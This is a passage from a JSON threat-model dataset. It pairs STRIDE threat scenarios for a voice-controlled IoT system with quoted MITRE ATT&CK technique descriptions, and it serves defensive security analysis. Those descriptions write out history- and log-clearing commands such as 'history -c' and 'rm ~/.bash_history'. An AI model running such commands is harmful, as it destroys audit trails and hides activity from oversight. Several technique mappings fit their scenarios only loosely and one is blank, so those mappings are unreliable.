                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker deletes or alters logs to cover their tracks after gaining unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has administrative access to the server-side application or cloud services.",
                    "Role": "Attacker",
                    "Condition": "Compromised credentials or exploiting admin-level vulnerabilities."
                },
                {
                    "Assumption": "Logging mechanisms are weak and do not provide tamper-evident records.",
                    "Role": "System Design",
                    "Condition": "Lack of secure logging solutions."
                },
                {
                    "Assumption": "There is no redundancy or backup of logs for forensics.",
                    "Role": "System Administrator",
                    "Condition": "No secondary storage or archive policies."
                }
            ],
            "Potential Impact": "Integrity: Loss of critical information needed for incident response and forensic analysis.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging modification",
                "unauthorized access",
                "forensics"
            ],
            "mitre_technique": {
                "name": "Clear Command History",
                "description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A)\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",
                "id": "attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a",
                "technique_id": "T1070.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive voice command data intercepted while in transit to the server.",
            "Assumptions": [
                {
                    "Assumption": "The communication between the client-side application and server is not encrypted properly.",
                    "Role": "System Design",
                    "Condition": "Using weak encryption or transmitting in plain text."
                },
                {
                    "Assumption": "An attacker has the capability to perform man-in-the-middle attacks on the network.",
                    "Role": "Attacker",
                    "Condition": "Network vulnerabilities or physical access to network infrastructure."
                },
                {
                    "Assumption": "There are no information integrity checks in place to detect tampering or interception.",
                    "Role": "System Design",
                    "Condition": "Lack of cryptographic integrity checks."
                }
            ],
            "Potential Impact": "Confidentiality: Unauthorized access to and potential misuse of sensitive voice command data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "voice command",
                "man-in-the-middle",
                "data in transit"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to logs stored in cloud services containing sensitive command data.",
            "Assumptions": [
                {
                    "Assumption": "The cloud service does not enforce strong access controls.",
                    "Role": "Cloud Service",
                    "Condition": "Misconfigured permissions or weak authentication mechanisms."
                },
                {
                    "Assumption": "Sensitive data is stored without encryption.",
                    "Role": "System Design",
                    "Condition": "Logs and data are stored in plaintext."
                },
                {
                    "Assumption": "No monitoring or alerting mechanisms to detect unauthorized access to the cloud service.",
                    "Role": "System Administrator",
                    "Condition": "Lack of real-time monitoring tools."
                }
            ],
            "Potential Impact": "Confidentiality: Exposure of logs which may contain sensitive voice commands or control requests.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud services",
                "data storage",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Cloud Services",
                "description": "Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password. ",
                "id": "attack-pattern--8861073d-d1b8-4941-82ce-dce621d398f0",
                "technique_id": "T1021.007"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An insider threat leaks sensitive voice command or control data.",
            "Assumptions": [
                {
                    "Assumption": "An insider has legitimate access to sensitive data.",
                    "Role": "Insider",
                    "Condition": "Employee, contractor, or third-party with access."
                },
                {
                    "Assumption": "There is inadequate monitoring of access and use of sensitive data.",
                    "Role": "System Design",
                    "Condition": "Lack of access and activity logs."
                },
                {
                    "Assumption": "Sensitive data is not properly segmented or access is not limited strictly based on roles.",
                    "Role": "System Design",
                    "Condition": "Ineffective access controls or role-based access management."
                }
            ],
            "Potential Impact": "Confidentiality: Unauthorized disclosure or leakage of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "insider threat",
                "voice command",
                "control data"
            ],
            "mitre_technique": {
                "name": "Data from Configuration Repository",
                "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
                "technique_id": "T1602"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the microphone with constant noise, preventing it from capturing legitimate voice commands.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can generate loud or constant noise that overwhelms the microphone input.",
                    "Role": "Attacker",
                    "Condition": "Physical proximity to the microphone or remote command of a noise-emitting device."
                },
                {
                    "Assumption": "The system does not have mechanisms to filter out or recognize persistent noise as malicious activity.",
                    "Role": "System Design",
                    "Condition": "No noise detection or filtering algorithms."
                },
                {
                    "Assumption": "There is no fallback or manual override when audio input is not recognized.",
                    "Role": "System Design",
                    "Condition": "Lack of alternative methods for command input."
                }
            ],
            "Potential Impact": "Availability: Disruption of system\u2019s ability to receive and respond to voice commands.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "microphone",
                "noise flooding",
                "audio disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--db4d67c9-93e4-4b40-b2eb-4c50534e4ab9",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A Distributed Denial of Service (DDoS) attack overwhelms the IoT controller or server-side application, disrupting normal operation.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can coordinate a large volume of traffic targeting the IoT controller or server.",
                    "Role": "Attacker",
                    "Condition": "Uses botnets or other DDoS tools."
                },
                {
                    "Assumption": "The system cannot withstand or mitigate high volumes of network traffic effectively.",
                    "Role": "System Design",
                    "Condition": "Insufficient DDoS protection measures."
                },
                {
                    "Assumption": "There is no adaptive capacity scaling for handling abnormal traffic spikes.",
                    "Role": "System Design",
                    "Condition": "No dynamic scaling or robust load balancers."
                }
            ],
            "Potential Impact": "Availability: Service disruption rendering IoT devices and voice commands unresponsive.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "network flood",
                "IoT controller",
                "server application"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits vulnerabilities in the client-side application causing it to crash or become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "The client-side application has unpatched vulnerabilities.",
                    "Role": "System Design",
                    "Condition": "Known or unknown software flaws."
                },
                {
                    "Assumption": "The attacker can send malformed or malicious inputs to the application.",
                    "Role": "Attacker",
                    "Condition": "Exploitation through user interface or API."
                },
                {
                    "Assumption": "There are no protective measures such as input validation or application firewalls in place.",
                    "Role": "System Design",
                    "Condition": "Weak application security controls."
                }
            ],
            "Potential Impact": "Availability: Client-side application crash leading to service unavailability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "client-side application",
                "exploitation",
                "crash",
                "unresponsiveness"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains administrative access to the IoT controller by exploiting weak authentication mechanisms.",
            "Assumptions": [
                {
                    "Assumption": "The authentication mechanisms for the IoT controller are weak or easily bypassed.",
                    "Role": "System Design",
                    "Condition": "Weak passwords or no multi-factor authentication."
                },
                {
                    "Assumption": "The attacker has some knowledge of the system or access to initial low-privileged accounts.",
                    "Role": "Attacker",
                    "Condition": "Reconnaissance or exploitation of lower-tier vulnerabilities."
                },
                {
                    "Assumption": "There are no monitoring or alerting mechanisms for unusual access patterns.",
                    "Role": "System Administrator",
                    "Condition": "Lack of anomaly detection and response measures."
                }
            ],
            "Potential Impact": "Confidentiality, Integrity, and Availability: Complete control over IoT devices, including unauthorized access, tampering, and service disruption.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "administrative access",
                "weak authentication",
                "IoT controller"
            ],
            "mitre_technique": {
                "name": "Cloud Administration Command",
                "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
                "id": "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7",
                "technique_id": "T1651"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a software flaw on the server-side application to execute commands with elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "The server-side application contains unpatched or unknown software vulnerabilities.",
                    "Role": "System Design",
                    "Condition": "Outdated software or zero-day exploits."
                },
                {
                    "Assumption": "The attacker can interact with the server-side application through a network or other interfaces.",
                    "Role": "Attacker",
                    "Condition": "Network accessibility or interface exposure."
                },
                {
                    "Assumption": "No measures are in place to restrict or monitor privilege escalation attempts.",
                    "Role": "System Design",
                    "Condition": "Lack of security controls such as role separation or privilege limitations."
                }
            ],
            "Potential Impact": "Confidentiality, Integrity, and Availability: Unauthorized actions including data access, modification, and disruption of services.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "server-side application",
                "command execution",
                "software flaw"
            ],
            "mitre_technique": {
                "name": "Indirect Command Execution",
                "description": "Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts. (Citation: VectorSec ForFiles Aug 2017) (Citation: Evi1cg Forfiles Nov 2017)\n\nAdversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.",
                "id": "attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e",
                "technique_id": "T1202"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses advanced persistent threat (APT) tactics to move laterally within the network and gain high-level access to cloud services.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has initial access to a low-privileged account or system.",
                    "Role": "Attacker",
                    "Condition": "Through phishing, malware, or credential compromise."
                },
                {
                    "Assumption": "The network lacks segmentation or adequate barriers to prevent lateral movement.",
                    "Role": "System Design",
                    "Condition": "Flat network structure or insufficient internal firewalls."
                },
                {
                    "Assumption": "There is no effective network monitoring to detect and respond to lateral movement activities.",
                    "Role": "System Administrator",
                    "Condition": "Absence of intrusion detection systems or security incident event management."
                }
            ],
            "Potential Impact": "Confidentiality, Integrity, and Availability: Full control over critical cloud services, leading to potential data breaches, corruption, and service disruption.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "APT",
                "lateral movement",
                "cloud services",
                "network"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "28",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof the user's voice commands by recording and replaying them to the microphone.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to a recorded sample of the user's voice.",
                    "Role": "Attacker",
                    "Condition": "The user\u2019s voice was recorded by the attacker in a prior interaction."
                },
                {
                    "Assumption": "The microphone is unable to distinguish between live and recorded audio.",
                    "Role": "System Component",
                    "Condition": "The microphone lacks advanced detection mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized commands executed, compromising data integrity.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "voice",
                "playback",
                "device"
            ],
            "mitre_technique": {
                "name": "Audio Capture",
                "description": "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.(Citation: ESET Attor Oct 2019)\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",
                "id": "attack-pattern--1035cdf2-3e5f-446f-a7a7-e8f6d7925967",
                "technique_id": "T1123"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could impersonate the server and send malicious responses to the client-side application.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept and alter communication between the server and client.",
                    "Role": "Attacker",
                    "Condition": "The system does not use secure communication protocols."
                },
                {
                    "Assumption": "The client-side application does not verify the server's identity.",
                    "Role": "Client-Side Application",
                    "Condition": "Lack of proper authentication mechanisms."
                }
            ],
            "Potential Impact": "Incorrect responses leading to potential data corruption.",
            "MITRE ATT&CK Keywords": [
                "network",
                "interception",
                "spoofing",
                "man-in-the-middle"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could exploit weak authentication methods to interact with IoT devices as a legitimate user.",
            "Assumptions": [
                {
                    "Assumption": "The attacker knows the user credentials or can guess them.",
                    "Role": "Attacker",
                    "Condition": "Weak or default passwords are used."
                },
                {
                    "Assumption": "The system relies solely on password authentication.",
                    "Role": "System",
                    "Condition": "No multi-factor authentication implemented."
                }
            ],
            "Potential Impact": "Unauthorized control of IoT devices, leading to potential safety risks.",
            "MITRE ATT&CK Keywords": [
                "credential",
                "brute force",
                "spoofing",
                "iot"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could tamper with audio signals being transmitted from the client-side application to the server.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the communication channel.",
                    "Role": "Attacker",
                    "Condition": "The network traffic is not encrypted."
                },
                {
                    "Assumption": "The client-side application does not verify the integrity of the transmitted signals.",
                    "Role": "Client-Side Application",
                    "Condition": "Lack of integrity checks."
                }
            ],
            "Potential Impact": "Corruption of command data sent to the server, leading to erroneous actions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "network",
                "injection",
                "audio"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could tamper with the firmware of the IoT devices to alter their functionality.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or remote access to the IoT device.",
                    "Role": "Attacker",
                    "Condition": "The device has unprotected firmware updates."
                },
                {
                    "Assumption": "The firmware update process is not secured.",
                    "Role": "IoT Device",
                    "Condition": "Lack of cryptographic verification."
                }
            ],
            "Potential Impact": "Compromised IoT devices leading to loss of data integrity and functionality.",
            "MITRE ATT&CK Keywords": [
                "firmware",
                "tampering",
                "iot",
                "device"
            ],
            "mitre_technique": {
                "name": "System Firmware",
                "description": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation: About UEFI)\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
                "id": "attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada",
                "technique_id": "T1542.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could manipulate the client-side application to send malicious control requests to the IoT controller.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can modify the application code or inject unauthorized commands.",
                    "Role": "Attacker",
                    "Condition": "The client-side application lacks code integrity validation."
                },
                {
                    "Assumption": "The IoT controller does not verify the legitimacy of incoming requests.",
                    "Role": "IoT Controller",
                    "Condition": "Lack of request authentication mechanisms."
                }
            ],
            "Potential Impact": "Execution of malicious actions on IoT devices, compromising system integrity and safety.",
            "MITRE ATT&CK Keywords": [
                "application",
                "tampering",
                "injection",
                "iot"
            ],
            "mitre_technique": {
                "name": "Compromise Software Dependencies and Development Tools",
                "description": "Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)  \n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. ",
                "id": "attack-pattern--191cc6af-1bb2-4344-ab5f-28e496638720",
                "technique_id": "T1195.001"
